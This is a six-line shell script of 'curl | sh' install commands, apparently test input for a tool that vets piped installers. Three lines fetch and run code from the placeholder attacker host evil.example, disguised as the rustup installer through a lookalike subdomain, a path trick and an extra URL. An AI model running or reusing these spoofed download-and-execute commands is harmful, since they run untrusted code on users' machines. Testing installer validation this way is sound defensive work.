#!/bin/sh
curl https://sh.rustup.rs.evil.example/x | sh
curl https://evil.example/sh.rustup.rs | sh
curl https://sh.rustup.rs https://evil.example/x | sh
curl https://github.com/axodotdev/cargo-dist/releases/latest/download/cargo-dist-installer.sh | sh
curl https://github.com/krakenfx/kraken-cli/releases/latest/download/kraken-cli-installer.sh | sh
curl https://example.invalid/install.sh | sh